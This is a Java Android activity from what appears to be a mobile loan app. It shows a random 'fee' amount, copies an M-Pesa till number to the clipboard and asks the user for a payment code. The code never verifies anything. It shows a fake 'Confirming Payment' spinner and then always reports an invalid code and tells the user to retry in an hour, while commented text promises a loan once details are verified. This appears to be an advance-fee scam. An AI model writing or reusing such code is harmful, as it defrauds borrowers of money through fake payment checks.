package com.shwa.kopes;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.facebook.BuildConfig;
import com.tapdaq.sdk.Tapdaq;
import com.tapdaq.sdk.common.TMAdError;
import com.tapdaq.sdk.listeners.TMAdListener;
import com.tapdaq.sdk.listeners.TMInitListener;


import java.util.Random;

public class till_mpesa extends AppCompatActivity {

    ProgressDialog dialog;

    String TAG = "FBADS";



    int i = 0;
    int x = 0;
    private EditText passEditText;
    private TextView amountrtext;
    ImageButton imageButton;
    AlertDialog.Builder builder;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_tillmpesa);
//        TapdaqConfig config = Tapdaq.getInstance().config();
//
//        config.setUserSubjectToGdprStatus(STATUS.TRUE); //GDPR declare if user is in EU
//        config.setConsentStatus(STATUS.TRUE); //GDPR consent must be obtained from the user
//        config.setAgeRestrictedUserStatus(STATUS.FALSE); //Is user subject to COPPA or GDPR age restrictions
//
//        Tapdaq.getInstance().initialize(till_mpesa.this, getResources().getString(R.string.applicationid), getResources().getString(R.string.appkey), config, new TapdaqInitListener());
//        Tapdaq.getInstance().setUserSubjectToGDPR(till_mpesa.this, STATUS.TRUE);
//        Tapdaq.getInstance().setConsentGiven(till_mpesa.this, STATUS.FALSE);
//        Tapdaq.getInstance().setIsAgeRestrictedUser(till_mpesa.this, STATUS.UNKNOWN);
       // this.mpesatxt = (EditText) findViewById(R.id.mpesainp);
        this.passEditText = (EditText) findViewById(R.id.password1);
        this.amountrtext = (TextView) findViewById(R.id.amountr);
        Random r = new Random();
        int minNumber = 70;
        int maxNumber = 100;
       int randomNumber = r.nextInt((maxNumber-minNumber)+1)+minNumber;
       String s = String.valueOf(+randomNumber);
        amountrtext.setText(getText(R.string.textamount)+s);

     //AdsManager.showBanner(this);

//        if (Tapdaq.getInstance().isVideoReady(till_mpesa.this,"default")) {
       // }

       // tv.setText("Dear Customer,\nOur company is committed to serving our customers based on trust and loyalty.\nFor that reason, Your information will be verified and once approved, you will get your loan immediately through the details you have shared.");
    }



    @Override
    protected void onDestroy() {
        super.onDestroy();
        AdsManager.dismissInters(this);
    }


    public void confirmmpesa(View arg0) {

        submitting();

    }

    public void copytillnumber(View arg0){
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("", "9350873");
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Till copied to clipboard", Toast.LENGTH_SHORT).show();
    }

//    <activity
//    android:name="com.kopa.kopes.SplashActivity"
//    android:screenOrientation="portrait"
//    android:theme="@style/SplashTheme"
//    android:exported="true">
//                    <intent-filter>
//                        <action android:name="android.intent.action.MAIN" />
//
//                        <category android:name="android.intent.category.LAUNCHER" />
//                    </intent-filter>
//                </activity>

    private boolean isValidMpesa(String mpesa) {
        if (mpesa == null || mpesa.length() < 4) {
            return false;
        }
        return true;
    }

    public void submitting() {
        this.dialog = ProgressDialog.show(this, BuildConfig.FLAVOR, "Confirming Payment..", true);
        this.dialog.show();
        new Handler().postDelayed(new Runnable() {
            public void run() {
                till_mpesa.this.dialog.dismiss();
                mpesaerror();
            }
        }, 3000);
    }

    public void mpesaerror() {
        SharedPreferences.Editor editor = getSharedPreferences("apply", MODE_PRIVATE).edit();
        editor.putString("apply", "confirm");
        editor.apply();
        this.passEditText.setError("INVALID CODE!!Failed try again after one hour");
      //  tv.setError("INVALID CODE!!Failed try again after one hour");
//        if (Tapdaq.getInstance().isVideoReady(till_mpesa.this,"default")) {
//            Tapdaq.getInstance().showVideo(till_mpesa.this, "default", new InterstitialListener());
//        }

    }
    public class TapdaqInitListener extends TMInitListener {

        public void didInitialise() {
            super.didInitialise();
            //Tapdaq.getInstance().loadVideo(<CurrentActivity>,  "my_video_tag", new VideoListener());
            Tapdaq.getInstance().loadVideo(till_mpesa.this,  "default",new InterstitialListener());
            // Ads may now be requested
        }

        @Override
        public void didFailToInitialise(TMAdError error) {
            super.didFailToInitialise(error);
            //Tapdaq failed to initialise
        }
    }
//    @Override
//    protected void onDestroy() {
//        if (adbanner != null) {
//            adbanner.destroy(MainActivity.this);
//        }
//        super.onDestroy();
//    }


    public class BannerListener extends TMAdListener {
        @Override
        public void didLoad() {
            // First banner loaded into view
        }

        @Override
        public void didFailToLoad(TMAdError error) {
            // No banners available. View will stop refreshing
        }

        @Override
        public void didRefresh() {
            // Subequent banner loaded, this view will refresh every 30 seconds
        }

        @Override
        public void didFailToRefresh(TMAdError error) {
            // Banner could not load, this view will attempt another refresh every 30 seconds
        }

        @Override
        public void didClick() {
            // User clicked on banner
        }

    }

    public class InterstitialListener extends TMAdListener {

        @Override
        public void didLoad() {
            // Ready to display the interstitial
            Tapdaq.getInstance().loadVideo(till_mpesa.this, "default", new InterstitialListener());
        }

    }
}
